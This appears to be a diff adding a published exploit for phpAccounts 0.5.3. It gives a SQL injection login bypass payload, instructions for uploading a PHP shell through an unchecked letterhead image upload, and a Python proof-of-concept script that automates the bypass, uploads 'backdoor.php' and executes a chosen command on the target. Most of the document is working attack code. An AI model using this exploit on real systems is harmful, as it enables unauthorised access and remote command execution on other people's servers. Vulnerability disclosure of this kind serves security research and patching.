@@ -1,0 +1,81 @@
+######################################################################################
+# Exploit phpAcounts v.0.5.3 SQL Injection
+# Date: June 6nd 2012
+# Author: loneferret
+# Version: 0.5.3
+# Vendor Url: http://phpaccounts.com/
+# Tested on: Ubuntu Server 11.10
+######################################################################################
+# Discovered by: loneferret
+######################################################################################
+
+# Old app, still fun.
+
+Auth. Bypass:
+http://<server>/phpaccounts/index.php
+Username: x' or '1'='1'#
+Password: <whatever>
+
+Upload php shell in preferences 
+Letterhead image upload does not sanitize file extensions.
+http://server/index.php?page=tasks&action=preferences
+
+Acess shell:
+Where '1' is the user's ID.
+http://server/phpaccounts/users/1/<filename>
+
+
+
+---- Python PoC ---------
+
+#!/usr/bin/python
+
+import re, mechanize
+import urllib, sys
+
+print "\n[*] phpAcounts v.0.5.3 Remote Code Execution"
+print "[*] Vulnerability discovered by loneferret"
+
+print "[*] Offensive Security - http://www.offensive-security.com\n"
+if (len(sys.argv) != 3):
+    print "[*] Usage: poc.py <RHOST> <RCMD>"
+    exit(0)
+
+rhost = sys.argv[1]
+rcmd = sys.argv[2]
+
+
+print "[*] Bypassing Login ."
+try:
+        br = mechanize.Browser()
+        br.open("http://%s/phpaccounts/index.php?frameset=true" % rhost)
+        assert br.viewing_html()
+        br.select_form(name="loginForm")
+        br.select_form(nr=0)
+        br.form['Login_Username'] = "x' or '1'#"
+        br.form['Login_Password'] = "pwnd"
+        print "[*] Triggering SQLi .."
+        br.submit()
+except:
+        print "[*] Oups..Something happened"
+        exit(0)
+
+print "[*] Uploading Shell ..."
+try:
+        br.open("http://%s/phpaccounts/index.php?page=tasks&action=preferences" % rhost)
+        assert br.viewing_html()
+        br.select_form(nr=0)
+        br.form["Preferences[LETTER_HEADER]"] = 'test'
+        br.form.add_file(open('backdoor.php'), "text/plain", "backdoor.php", name="letterhead_image")
+        br.submit(nr=2)
+except:
+        print "[*] Upload didn't work"
+        exit(0)
+
+print "[*] Command Executed\n"
+try:
+        shell = urllib.urlopen("http://%s/phpaccounts/users/1/backdoor.php?cmd=%s" % (rhost,rcmd))
+        print shell.read()
+except:
+        print "[*] Oups."
+        exit(0)
